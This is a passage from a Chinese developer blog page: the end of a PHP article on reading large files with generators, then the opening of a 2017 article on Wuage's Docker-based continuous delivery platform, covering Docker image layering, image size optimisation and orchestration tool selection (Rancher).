fclose($handle);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">foreach (readTxt() as $key =&gt; $value) {</span><br><span class="line">    # code...</span><br><span class="line">    echo $value.&apos;&lt;br /&gt;&apos;;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/songjianzaina/juejin_p4/raw/master/img/6ee4271a0cffabf963b30ef8c5387922e0acabfd09476c34f2d4d79ad67e25d7" alt></p>
<p>&#x901A;&#x8FC7;&#x4E0A;&#x56FE;&#x7684;&#x8F93;&#x51FA;&#x7ED3;&#x679C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x770B;&#x51FA;&#x4EE3;&#x7801;&#x5B8C;&#x5168;&#x6B63;&#x5E38;&#x3002;</p>
<p>&#x4F46;&#x662F;&#xFF0C;&#x80CC;&#x540E;&#x7684;&#x4EE3;&#x7801;&#x6267;&#x884C;&#x89C4;&#x5219;&#x5374;&#x4E00;&#x70B9;&#x513F;&#x4E5F;&#x4E0D;&#x4E00;&#x6837;&#x3002;&#x4F7F;&#x7528;&#x751F;&#x6210;&#x5668;&#x8BFB;&#x53D6;&#x6587;&#x4EF6;&#xFF0C;&#x7B2C;&#x4E00;&#x6B21;&#x8BFB;&#x53D6;&#x4E86;&#x7B2C;&#x4E00;&#x884C;&#xFF0C;&#x7B2C;&#x4E8C;&#x6B21;&#x8BFB;&#x53D6;&#x4E86;&#x7B2C;&#x4E8C;&#x884C;&#xFF0C;&#x4EE5;&#x6B64;&#x7C7B;&#x63A8;&#xFF0C;<strong>&#x6BCF;&#x6B21;&#x88AB;&#x52A0;&#x8F7D;&#x5230;&#x5185;&#x5B58;&#x4E2D;&#x7684;&#x6587;&#x5B57;&#x53EA;&#x6709;&#x4E00;&#x884C;</strong>&#xFF0C;&#x5927;&#x5927;&#x7684;&#x51CF;&#x5C0F;&#x4E86;&#x5185;&#x5B58;&#x7684;&#x4F7F;&#x7528;&#x3002;</p>
<p>&#x8FD9;&#x6837;&#xFF0C;&#x5373;&#x4F7F;&#x8BFB;&#x53D6;&#x4E0A;G&#x7684;&#x6587;&#x672C;&#x4E5F;&#x4E0D;&#x7528;&#x62C5;&#x5FC3;&#xFF0C;&#x5B8C;&#x5168;&#x53EF;&#x4EE5;&#x50CF;&#x8BFB;&#x53D6;&#x5F88;&#x5C0F;&#x6587;&#x4EF6;&#x4E00;&#x6837;&#x7F16;&#x5199;&#x4EE3;&#x7801;&#x3002;</p>
<h2 id="&#x5B8C;"><a href="#&#x5B8C;" class="headerlink" title="&#x5B8C;"></a>&#x5B8C;</h2><p>&#x63A8;&#x8350;&#x4E00;&#x4E2A;&#x6211;&#x4EEC;&#x56E2;&#x961F;&#x81EA;&#x5DF1;&#x5F00;&#x53D1;&#x7684;&#x9488;&#x5BF9;&#x5F00;&#x53D1;&#x8005;&#x7684;&#x7F51;&#x5740;&#x5BFC;&#x822A;&#xFF1A;<a href="/external_links/825d710343c408f2385e88a62f0a2ebf.html" target="blank" rel="noopener">&#x7B14;&#x70B9;&#x5BFC;&#x822A; - &#x7528;&#x5FC3;&#x505A;&#x6700;&#x7B80;&#x6D01;&#x7684;&#x7F51;&#x5740;&#x5BFC;&#x822A;</a></p>
<p><strong>&#x672C;&#x6587;&#x8F6C;&#x8F7D;&#x81EA;:</strong> <a href="/external_links/5f0edb36bb49d9111756367971b09d2f.html" target="blank" rel="noopener">&#x6398;&#x91D1;</a></p>
<p><em><a href="https://dev.newban.cn/">&#x5F00;&#x53D1;&#x8005;&#x535A;&#x5BA2; &#x2013; &#x548C;&#x5F00;&#x53D1;&#x76F8;&#x5173;&#x7684; &#x8FD9;&#x91CC;&#x5168;&#x90FD;&#x6709;</a></em></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://dev.newban.cn../../6844903520131366920.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="开发者博客">
      <meta itemprop="description" content>
      <meta itemprop="image" content="../../images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="开发者博客 – IT技术 尽在开发者博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="../../6844903520131366920.html" itemprop="url">基于Docker持续交付平台建设的实践</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-12-08T13:43:57+08:00">
                2017-12-08
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>&#x5BFC;&#x8BFB;&#xFF1A;&#x4E2D;&#x56FD;&#x4E94;&#x77FF;&#x548C;&#x963F;&#x91CC;&#x5DF4;&#x5DF4;&#x8054;&#x624B;&#x6253;&#x9020;&#x7684;&#x94A2;&#x94C1;&#x670D;&#x52A1;&#x4E13;&#x4E1A;&#x5E73;&#x53F0;&#x4E94;&#x963F;&#x54E5;&#xFF0C;&#x901A;&#x8FC7;&#x96C6;&#x7ED3;&#x963F;&#x91CC;&#x5DF4;&#x5DF4;&#x5728;&#x5927;&#x6570;&#x636E;&#x3001;&#x7535;&#x5546;&#x5E73;&#x53F0;&#x548C;&#x4E92;&#x8054;&#x7F51;&#x4EA7;&#x54C1;&#x6280;&#x672F;&#x4E0A;&#x7684;&#x4F18;&#x52BF;&#xFF0C;&#x4E3A;&#x7EC8;&#x7AEF;&#x7528;&#x6237;&#x5E26;&#x6765;&#x4E00;&#x7AD9;&#x5F0F;&#x91C7;&#x8D2D;&#x4F53;&#x9A8C;&#x3002;&#x672C;&#x6587;&#x662F;&#x4E94;&#x963F;&#x54E5;&#x8FD0;&#x7EF4;&#x6280;&#x672F;&#x56E2;&#x961F;&#x9488;&#x5BF9;Docker&#x5BB9;&#x5668;&#x6280;&#x672F;&#x5728;&#x5982;&#x4F55;&#x5728;&#x6301;&#x7EED;&#x4EA4;&#x4ED8;&#x8FC7;&#x7A0B;&#x4E2D;&#x63A2;&#x7D22;&#x548C;&#x5B9E;&#x8DF5;&#xFF0C;&#x76EE;&#x524D;&#x5DF2;&#x7ECF;&#x5C06;&#x53D1;&#x5E03;&#x90E8;&#x7F72;&#x6743;&#x9650;&#x5F00;&#x653E;&#x7ED9;&#x5E94;&#x7528;&#x5F00;&#x53D1;&#x7684;owner&#xFF0C;&#x5B9E;&#x73B0;7*24&#x5C0F;&#x65F6;&#x201C;&#x4E00;&#x7AD9;&#x5F0F;&#x201D;&#x7684;&#x6301;&#x7EED;&#x4EA4;&#x4ED8;&#xFF0C;&#x6574;&#x4F53;&#x63D0;&#x9AD8;&#x4E86;&#x516C;&#x53F8;&#x7814;&#x53D1;&#x8FC7;&#x7A0B;&#x7684;&#x4EA4;&#x4ED8;&#x80FD;&#x529B;&#x3002;</p>
<h2 id="&#x524D;&#x8A00;"><a href="#&#x524D;&#x8A00;" class="headerlink" title="&#x524D;&#x8A00;"></a><strong>&#x524D;&#x8A00;</strong></h2><p>&#x4F5C;&#x4E3A;&#x521B;&#x4E1A;&#x516C;&#x53F8;&#x548C;&#x63A8;&#x884C;DevOps&#x5DE5;&#x7A0B;&#x5E08;&#x4EEC;&#x6765;&#x8BF4;&#xFF0C;&#x90FD;&#x9047;&#x5230;&#x8FC7;&#x8FD9;&#x6837;&#x7684;&#x95EE;&#x9898;&#xFF1A;</p>
<ol>
<li>&#x786C;&#x4EF6;&#x8D44;&#x6E90;&#x5229;&#x7528;&#x7387;&#x7684;&#x95EE;&#x9898;&#xFF0C;&#x9020;&#x6210;&#x90E8;&#x5206;&#x6210;&#x672C;&#x7684;&#x6D6A;&#x8D39; &#x5728;&#x7F51;&#x7AD9;&#x529F;&#x80FD;&#x4E2D;&#x4E0D;&#x540C;&#x7684;&#x4E1A;&#x52A1;&#x573A;&#x666F;&#x6709;&#x8BA1;&#x7B97;&#x578B;&#x7684;&#x3001;&#x6709;IO&#x8BFB;&#x5199;&#x578B;&#x7684;&#x3001;&#x6709;&#x7F51;&#x7EDC;&#x578B;&#x3001;&#x6709;&#x5185;&#x5B58;&#x578B;&#x7684;&#xFF0C;&#x96C6;&#x4E2D;&#x90E8;&#x7F72;&#x5E94;&#x7528;&#x5C31;&#x4F1A;&#x5BFC;&#x81F4;&#x8D44;&#x6E90;&#x5229;&#x7528;&#x7387;&#x4E0D;&#x5408;&#x7406;&#x7684;&#x95EE;&#x9898;&#x3002;&#x6BD4;&#x5982;&#xFF0C;&#x4E00;&#x4E2A;&#x673A;&#x5668;&#x4E0A;&#x90E8;&#x7F72;&#x7684;&#x670D;&#x52A1;&#x90FD;&#x662F;&#x5185;&#x5B58;&#x5BC6;&#x96C6;&#x578B;&#xFF0C;&#x90A3;&#x4E48;CPU&#x8D44;&#x6E90;&#x5C31;&#x90FD;&#x5F88;&#x5BB9;&#x6613;&#x6D6A;&#x8D39;&#x4E86;&#x3002;</li>
<li>&#x5355;&#x7269;&#x7406;&#x673A;&#x591A;&#x5E94;&#x7528;&#x65E0;&#x6CD5;&#x5BF9;&#x65E0;&#x6CD5;&#x8FDB;&#x884C;&#x6709;&#x6548;&#x7684;&#x9694;&#x79BB;&#xFF0C;&#x5BFC;&#x81F4;&#x5E94;&#x7528;&#x5BF9;&#x8D44;&#x6E90;&#x7684;&#x62A2;&#x5360;&#x548C;&#x76F8;&#x4E92;&#x5F71;&#x54CD; &#x4E00;&#x4E2A;&#x7269;&#x7406;&#x673A;&#x5668;&#x8DD1;&#x591A;&#x4E2A;&#x5E94;&#x7528;&#xFF0C;&#x65E0;&#x6CD5;&#x8FDB;&#x884C;&#x6240;&#x4F7F;&#x7528;&#x7684;CPU&#x3001;&#x5185;&#x5B58;&#x3001;&#x8FDB;&#x7A0B;&#x8FDB;&#x884C;&#x9650;&#x5236;&#xFF0C;&#x5982;&#x679C;&#x4E00;&#x4E2A;&#x5E94;&#x7528;&#x51FA;&#x73B0;&#x5BF9;&#x8D44;&#x6E90;&#x7684;&#x62A2;&#x5360;&#x95EE;&#x9898;&#xFF0C;&#x5C31;&#x4F1A;&#x5F15;&#x8D77;&#x8FDE;&#x9501;&#x53CD;&#x5E94;&#xFF0C;&#x6700;&#x7EC8;&#x5BFC;&#x81F4;&#x7F51;&#x7AD9;&#x90E8;&#x5206;&#x529F;&#x80FD;&#x4E0D;&#x53EF;&#x7528;&#x3002;</li>
<li>&#x73AF;&#x5883;&#x3001;&#x7248;&#x672C;&#x7BA1;&#x7406;&#x590D;&#x6742;&#xFF0C;&#x4E0A;&#x7EBF;&#x90E8;&#x7F72;&#x6D41;&#x7A0B;&#x7F3A;&#x4E4F;&#xFF0C;&#x589E;&#x52A0;&#x95EE;&#x9898;&#x6392;&#x67E5;&#x7684;&#x590D;&#x6742;&#x5EA6; &#x7531;&#x4E8E;&#x5185;&#x90E8;&#x5F00;&#x53D1;&#x6D41;&#x7A0B;&#x7684;&#x4E0D;&#x89C4;&#x8303;&#xFF0C;&#x4EE3;&#x7801;&#x5728;&#x6D4B;&#x8BD5;&#x6216;&#x8005;&#x4E0A;&#x7EBF;&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;&#x5BF9;&#x4E00;&#x4E9B;&#x914D;&#x7F6E;&#x9879;&#x548C;&#x7CFB;&#x7EDF;&#x53C2;&#x6570;&#x8FDB;&#x884C;&#x968F;&#x610F;&#x7684;&#x8C03;&#x6574;&#xFF0C;&#x5728;&#x53D1;&#x5E03;&#x65F6;&#x8FDB;&#x884C;&#x589E;&#x91CF;&#x53D1;&#x5E03;&#xFF0C;&#x4E00;&#x65E6;&#x51FA;&#x73B0;&#x95EE;&#x9898;&#xFF0C;&#x5C31;&#x4F1A;&#x5BFC;&#x81F4;&#x6D4B;&#x8BD5;&#x7684;&#x4EE3;&#x7801;&#x548C;&#x7EBF;&#x4E0A;&#x8FD0;&#x884C;&#x7684;&#x4EE3;&#x7801;&#x662F;&#x4E0D;&#x4E00;&#x81F4;&#x7684;&#xFF0C;&#x589E;&#x52A0;&#x4E86;&#x670D;&#x52A1;&#x4E0A;&#x7EBF;&#x7684;&#x98CE;&#x9669;&#xFF0C;&#x4E5F;&#x589E;&#x52A0;&#x4E86;&#x7EBF;&#x4E0A;&#x670D;&#x52A1;&#x6545;&#x969C;&#x6392;&#x67E5;&#x7684;&#x96BE;&#x5EA6;&#x3002;</li>
<li>&#x73AF;&#x5883;&#x4E0D;&#x7A33;&#x5B9A;&#xFF0C;&#x8FC1;&#x79FB;&#x6210;&#x672C;&#x9AD8;&#xFF0C;&#x589E;&#x52A0;&#x4E0A;&#x7EBF;&#x98CE;&#x9669; &#x5728;&#x5F00;&#x53D1;&#x8FC7;&#x7A0B;&#x4E2D;&#x5B58;&#x5728;&#x591A;&#x4E2A;&#x9879;&#x76EE;&#x5E76;&#x884C;&#x5F00;&#x53D1;&#x548C;&#x670D;&#x52A1;&#x7684;&#x4F9D;&#x8D56;&#x95EE;&#x9898;&#xFF0C;&#x7531;&#x4E8E;&#x73AF;&#x5883;&#x548C;&#x7248;&#x672C;&#x7684;&#x590D;&#x6742;&#x6027;&#x5F88;&#x9AD8;&#xFF0C;&#x4E0D;&#x80FD;&#x5FEB;&#x901F;&#x642D;&#x5EFA;&#x548C;&#x8FC1;&#x79FB;&#x4E00;&#x4E2A;&#x73AF;&#x5883;&#xFF0C;&#x5BFC;&#x81F4;&#x65E0;&#x6CD5;&#x5728;&#x6D4B;&#x8BD5;&#x73AF;&#x5883;&#x4E2D;&#x65E0;&#x6CD5;&#x6A21;&#x62DF;&#x51FA;&#x7EBF;&#x4E0A;&#x7684;&#x6D41;&#x7A0B;&#x8FDB;&#x884C;&#x6D4B;&#x8BD5;&#xFF0C;&#x5F88;&#x591A;&#x540C;&#x5B66;&#x5728;&#x7EBF;&#x4E0A;&#x73AF;&#x5883;&#x8FDB;&#x884C;&#x6D4B;&#x8BD5;&#xFF0C;&#x8FD9;&#x91CC;&#x6709;&#x5F88;&#x9AD8;&#x7684;&#x6F5C;&#x5728;&#x98CE;&#x9669;&#xFF0C;&#x540C;&#x65F6;&#x5BFC;&#x81F4;&#x5F00;&#x53D1;&#x6548;&#x7387;&#x964D;&#x4F4E;&#x3002;</li>
<li>&#x4F20;&#x7EDF;&#x865A;&#x62DF;&#x673A;&#x548C;&#x7269;&#x7406;&#x673A;&#x5360;&#x7528;&#x7A7A;&#x95F4;&#x5927;&#xFF0C;&#x542F;&#x52A8;&#x6162;&#xFF0C;&#x7BA1;&#x7406;&#x590D;&#x6742;&#x7B49;&#x95EE;&#x9898; &#x4F20;&#x7EDF;&#x865A;&#x62DF;&#x673A;&#x548C;&#x7269;&#x7406;&#x673A;&#x5728;&#x542F;&#x52A8;&#x8FC7;&#x7A0B;&#x8FDB;&#x884C;&#x52A0;&#x8F7D;&#x5185;&#x6838;&#xFF0C;&#x6267;&#x884C;&#x5185;&#x6838;&#x548C;init&#x8FDB;&#x884C;&#xFF0C;&#x5BFC;&#x81F4;&#x5728;&#x542F;&#x52A8;&#x8FC7;&#x7A0B;&#x5360;&#x7528;&#x5F88;&#x957F;&#x65F6;&#x95F4;&#xFF0C;&#x800C;&#x4E14;&#x5728;&#x7BA1;&#x7406;&#x8FC7;&#x7A0B;&#x4E2D;&#x4F1A;&#x9047;&#x5230;&#x5404;&#x79CD;&#x5404;&#x6837;&#x7684;&#x7BA1;&#x7406;&#x95EE;&#x9898;&#x3002;</li>
</ol>
<p>&#x57FA;&#x4E8E;Docker&#x5BB9;&#x5668;&#x6280;&#x672F;&#xFF0C;&#x8FD0;&#x7EF4;&#x6280;&#x672F;&#x56E2;&#x961F;&#x5F00;&#x53D1;&#x4E86;&#x4E94;&#x963F;&#x54E5;&#x7F51;&#x7AD9;&#x7684;&#x5BB9;&#x5668;&#x4E91;&#x5E73;&#x53F0;&#x3002;&#x901A;&#x8FC7;&#x5BB9;&#x5668;&#x4E91;&#x5E73;&#x53F0;95%&#x7684;&#x5E94;&#x7528;&#x670D;&#x52A1;&#x5DF2;&#x7ECF;&#x5B9E;&#x73B0;&#x5BB9;&#x5668;&#x5316;&#x90E8;&#x7F72;&#x3002;&#x8FD9;&#x4E9B;&#x5E94;&#x7528;&#x652F;&#x6301;&#x4E1A;&#x52A1;&#x6309;&#x9700;&#x62D3;&#x5C55;&#xFF0C;&#x79D2;&#x7EA7;&#x4F38;&#x7F29;&#xFF0C;&#x63D0;&#x4F9B;&#x4E0E;&#x7528;&#x6237;&#x53CB;&#x597D;&#x7684;&#x4EA4;&#x4E92;&#x8FC7;&#x7A0B;&#xFF0C;&#x89C4;&#x8303;&#x4E86;&#x6D4B;&#x8BD5;&#x548C;&#x751F;&#x4EA7;&#x7684;&#x53D1;&#x5E03;&#x6D41;&#x7A0B;&#xFF0C;&#x8BA9;&#x5F00;&#x53D1;&#x548C;&#x6D4B;&#x8BD5;&#x540C;&#x5B66;&#x4ECE;&#x57FA;&#x7840;&#x7684;&#x73AF;&#x5883;&#x914D;&#x7F6E;&#x548C;&#x53D1;&#x5E03;&#x89E3;&#x653E;&#x51FA;&#x6765;&#xFF0C;&#x4F7F;&#x5176;&#x66F4;&#x805A;&#x7126;&#x81EA;&#x5DF1;&#x7684;&#x9879;&#x76EE;&#x5F00;&#x53D1;&#x548C;&#x6D4B;&#x8BD5;&#x3002; </p>
<p><img src="https://gitee.com/songjianzaina/juejin_p4/raw/master/img/7875d900ff612bf4b3cab65fcd571fa71b050f585e56fc6b40750e68e353fe68" alt></p>
<p> &#x56FE;1 &#x4E94;&#x963F;&#x54E5;&#x5BB9;&#x5668;&#x4E91;&#x6574;&#x4F53;&#x67B6;&#x6784;<br> &#x7ED3;&#x5408;&#x4E94;&#x963F;&#x54E5;&#x5BB9;&#x5668;&#x4E91;&#x5E73;&#x53F0;&#x548C;Docker&#x5BB9;&#x5668;&#x6280;&#x672F;&#x7684;&#x5B9E;&#x8DF5;&#xFF0C;&#x672C;&#x6587;&#x5148;&#x4ECB;&#x7ECD;&#x5982;&#x4F55;&#x5B9E;&#x73B0;7*24&#x5C0F;&#x65F6;&#x201C;&#x4E00;&#x7AD9;&#x5F0F;&#x201D;&#x7684;&#x6301;&#x7EED;&#x4EA4;&#x4ED8;&#xFF0C;&#x5B9E;&#x73B0;&#x4EA7;&#x54C1;&#x7684;&#x4E0A;&#x7EBF;&#x3002;&#x5173;&#x4E8E;&#x5BB9;&#x5668;&#x4E91;&#x5E73;&#x53F0;&#x7684;&#x4ECB;&#x7ECD;&#xFF0C;&#x8BF7;&#x5173;&#x6CE8;&#xFF1A;<a href="/external_links/707c5263f7c05f511ede902b78de5a45.html" target="blank" rel="noopener">https://zhuanlan.zhihu.com/idevops</a></p>
<h2 id="Docker&#x955C;&#x50CF;&#x6807;&#x51C6;&#x5316;"><a href="#Docker&#x955C;&#x50CF;&#x6807;&#x51C6;&#x5316;" class="headerlink" title="Docker&#x955C;&#x50CF;&#x6807;&#x51C6;&#x5316;"></a><strong>Docker&#x955C;&#x50CF;&#x6807;&#x51C6;&#x5316;</strong></h2><p>&#x4F17;&#x6240;&#x5468;&#x77E5;&#xFF0C;Docker&#x7684;&#x955C;&#x50CF;&#x662F;&#x5206;&#x5C42;&#x7684;&#x3002;&#x5BF9;&#x955C;&#x50CF;&#x5206;&#x5C42;&#x8FDB;&#x884C;&#x7EA6;&#x5B9A;&#xFF1A;</p>
<ul>
<li>&#x7B2C;&#x4E00;&#x5C42;&#x662F;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x5C42;&#xFF0C;&#x7531;CentOS/Alpine&#x7B49;&#x57FA;&#x7840;&#x955C;&#x50CF;&#x6784;&#x6210;&#xFF0C;&#x5B89;&#x88C5;&#x4E00;&#x4E9B;&#x901A;&#x7528;&#x7684;&#x57FA;&#x7840;&#x7EC4;&#x4EF6;&#xFF1B;</li>
<li>&#x7B2C;&#x4E8C;&#x5C42;&#x662F;&#x4E2D;&#x95F4;&#x4EF6;&#x5C42;&#xFF0C;&#x6839;&#x636E;&#x4E0D;&#x540C;&#x7684;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#xFF0C;&#x5B89;&#x88C5;&#x5B83;&#x4EEC;&#x8FD0;&#x884C;&#x65F6;&#x9700;&#x8981;&#x4F7F;&#x7528;&#x5230;&#x7684;&#x5404;&#x79CD;&#x4E2D;&#x95F4;&#x4EF6;&#x548C;&#x4F9D;&#x8D56;&#x8F6F;&#x4EF6;&#x5305;&#xFF0C;&#x5982;&#xFF0C;nginx&#x3001;tomcat&#x7B49;&#xFF1B;</li>
<li>&#x7B2C;&#x4E09;&#x5C42;&#x662F;&#x5E94;&#x7528;&#x5C42;&#xFF0C;&#x8FD9;&#x5C42;&#x4EC5;&#x5305;&#x542B;&#x5DF2;&#x7ECF;&#x6253;&#x597D;&#x5305;&#x7684;&#x5404;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x4EE3;&#x7801;&#x3002; <img src="https://gitee.com/songjianzaina/juejin_p4/raw/master/img/e5ae84245cc3fdbf3986689a69588c3a11bf999df556a9d618374811b33cc516" alt></li>
</ul>
<p> &#x56FE;2&#xFF1A;Docker&#x955C;&#x50CF;&#x5206;&#x5C42;&#x7EA6;&#x5B9A;</p>
<p>&#x7ECF;&#x9A8C;&#x603B;&#x7ED3;&#xFF1A;&#x5982;&#x4F55;&#x8BA9;&#x81EA;&#x5DF1;&#x7684;&#x955C;&#x50CF;&#x53D8;&#x7684;&#x66F4;&#x5C0F;&#xFF0C;PUSH&#x7684;&#x66F4;&#x5FEB;&#xFF1F; </p>
<p><img src="https://gitee.com/songjianzaina/juejin_p4/raw/master/img/390087740fce7bbfa8cb22b88c7016b7a5c05241b71d8e3aa594ad86eec508f5" alt></p>
<p> &#x56FE;3 &#x4F18;&#x5316;&#x524D;&#x540E;&#x5BF9;&#x6BD4;</p>
<ul>
<li>dockerfile&#x6784;&#x5EFA;&#x5E94;&#x7528;&#x955C;&#x50CF;&#xFF0C;&#x5728;&#x4E2D;&#x95F4;&#x4EF6;&#x5C42;&#x9047;&#x5230;&#x4E00;&#x4E9B;&#x9700;&#x8981;&#x5B89;&#x88C5;&#x7684;&#x8F6F;&#x4EF6;&#x5305;&#x65F6;&#xFF0C;&#x5C3D;&#x53EF;&#x80FD;&#x7684;&#x4F7F;&#x7528;&#x5305;&#x7BA1;&#x7406;&#x5DE5;&#x5177;&#xFF08;&#x5982;yum&#xFF09;&#x6216;&#x4EE5;git clone&#x65B9;&#x5F0F;&#x4E0B;&#x8F7D;&#x6E90;&#x7801;&#x5305;&#x8FDB;&#x884C;&#x5B89;&#x88C5;&#xFF0C;&#x76EE;&#x7684;&#x662F;&#x5C06;&#x8F6F;&#x4EF6;&#x5305;&#x7684;copy&#x548C;&#x5B89;&#x88C5;&#x63A7;&#x5236;&#x5728;&#x540C;&#x4E00;&#x5C42;&#xFF0C;&#x8F6F;&#x4EF6;&#x90E8;&#x7F72;&#x6210;&#x529F;&#x540E;&#x6E05;&#x9664;&#x4E00;&#x4E9B;&#x65E0;&#x7528;&#x7684;rpm&#x5305;&#x6216;&#x6E90;&#x7801;&#x5305;&#xFF0C;&#x8BA9;&#x57FA;&#x7840;&#x955C;&#x50CF;&#x7684;&#x5C3A;&#x5BF8;&#x66F4;&#x5C0F;&#x3002;<ul>
<li>Java&#x5E94;&#x7528;&#x955C;&#x50CF;&#x4E2D;&#x5E76;&#x6CA1;&#x6709;&#x5C06;jdk&#x8F6F;&#x4EF6;&#x5305;&#x6253;&#x5165;&#x955C;&#x50CF;&#xFF0C;&#x5C06;jdk&#x90E8;&#x7F72;&#x5728;&#x6BCF;&#x53F0;&#x5BBF;&#x4E3B;&#x4E0A;&#xFF0C;&#x5728;&#x8FD0;&#x884C;&#x955C;&#x50CF;&#x65F6;&#xFF0C;&#x901A;&#x8FC7;&#x6302;&#x8F7D;&#x76EE;&#x5F55;&#x7684;&#x65B9;&#x5F0F;&#x5C06;&#x5BBF;&#x4E3B;&#x673A;&#x4E0A;&#x7684;java&#x5BB6;&#x76EE;&#x5F55;&#x6302;&#x8F7D;&#x81F3;&#x5BB9;&#x5668;&#x6307;&#x5B9A;&#x76EE;&#x5F55;&#x4E0B;&#x3002;&#x56E0;&#x4E3A;&#x5B83;&#x4F1A;&#x628A;&#x57FA;&#x7840;&#x955C;&#x50CF;&#x6491;&#x5F97;&#x975E;&#x5E38;&#x5927;&#xFF1B;</li>
<li>&#x5728;&#x6784;&#x5EFA;&#x5E94;&#x7528;&#x955C;&#x50CF;&#x65F6;&#xFF0C;docker&#x4F1A;&#x5BF9;&#x8FD9;&#x4E24;&#x5C42;&#x8FDB;&#x884C;&#x7F13;&#x5B58;&#x5E76;&#x76F4;&#x63A5;&#x4F7F;&#x7528;&#xFF0C;&#x4EC5;&#x4F1A;&#x91CD;&#x65B0;&#x521B;&#x5EFA;&#x4EE3;&#x7801;&#x51FA;&#x73B0;&#x53D8;&#x52A8;&#x7684;&#x5E94;&#x7528;&#x5C42;&#xFF0C;&#x8FD9;&#x6837;&#x5C31;&#x63D0;&#x9AD8;&#x4E86;&#x5E94;&#x7528;&#x955C;&#x50CF;&#x7684;&#x6784;&#x5EFA;&#x901F;&#x5EA6;&#x548C;&#x6784;&#x5EFA;&#x6210;&#x529F;&#x540E;&#x5411;&#x955C;&#x50CF;&#x4ED3;&#x5E93;&#x63A8;&#x9001;&#x7684;&#x901F;&#x5EA6;&#xFF0C;&#x4ECE;&#x6574;&#x4F53;&#x6D41;&#x7A0B;&#x4E0A;&#x63D0;&#x5347;&#x4E86;&#x5E94;&#x7528;&#x7684;&#x90E8;&#x7F72;&#x6548;&#x7387;&#x3002;</li>
</ul>
</li>
</ul>
<h2 id="&#x5BB9;&#x5668;&#x7684;&#x7F16;&#x6392;&#x7BA1;&#x7406;"><a href="#&#x5BB9;&#x5668;&#x7684;&#x7F16;&#x6392;&#x7BA1;&#x7406;" class="headerlink" title="&#x5BB9;&#x5668;&#x7684;&#x7F16;&#x6392;&#x7BA1;&#x7406;"></a><strong>&#x5BB9;&#x5668;&#x7684;&#x7F16;&#x6392;&#x7BA1;&#x7406;</strong></h2><h3 id="&#x7F16;&#x6392;&#x5DE5;&#x5177;&#x7684;&#x9009;&#x578B;&#xFF1A;"><a href="#&#x7F16;&#x6392;&#x5DE5;&#x5177;&#x7684;&#x9009;&#x578B;&#xFF1A;" class="headerlink" title="&#x7F16;&#x6392;&#x5DE5;&#x5177;&#x7684;&#x9009;&#x578B;&#xFF1A;"></a><strong>&#x7F16;&#x6392;&#x5DE5;&#x5177;&#x7684;&#x9009;&#x578B;&#xFF1A;</strong></h3><p><img src="https://gitee.com/songjianzaina/juejin_p4/raw/master/img/9dacad289d60a4b5f5423204bc3178523831a27773fdd09bf1147f969a1c0064" alt></p>
<p> &#x56FE;4&#xFF1A;&#x7F16;&#x6392;&#x5DE5;&#x5177;&#x9009;&#x578B;&#x5BF9;&#x6BD4;<br> Rancher&#x56FE;&#x5F62;&#x5316;&#x7BA1;&#x7406;&#x754C;&#x9762;&#xFF0C;&#x90E8;&#x7F72;&#x7B80;&#x5355;&#x3001;&#x65B9;&#x4FBF;&#xFF0C; &#x53EF;&#x4EE5;&#x4E0E;AD&#x3001;LDAP&#x3001;GITHUB&#x96C6;&#x6210;&#xFF0C;&#x57FA;&#x4E8E;&#x7528;&#x6237;&#x6216;&#x7528;&#x6237;&#x7EC4;&#x8FDB;&#x884C;&#x8BBF;&#x95EE;&#x63A7;&#x5236;&#xFF0C;&#x5FEB;&#x901F;&#x5C06;&#x7CFB;&#x7EDF;&#x7684;&#x7F16;&#x6392;&#x5DE5;&#x5177;&#x5347;&#x7EA7;&#x81F3;Kubernetes&#x6216;&#x8005;Swarm&#xFF0C;&#x540C;&#x65F6;&#x6709;&#x4E13;&#x4E1A;&#x7684;&#x6280;&#x672F;&#x56E2;&#x961F;&#x8FDB;&#x884C;&#x652F;&#x6301;&#xFF0C;&#x964D;&#x4F4E;&#x5BB9;&#x5668;&#x6280;&#x672F;&#x5165;&#x95E8;&#x7684;&#x96BE;&#x5EA6;&#x3002; </p>
<p><img src="https://gitee.com/songjianzaina/juejin_p4/raw/master/img/5011b3108de2ddf49062fde93a61f9547d5d2d0ef42a1ead9fdd38e1d9c94e99" alt></p>
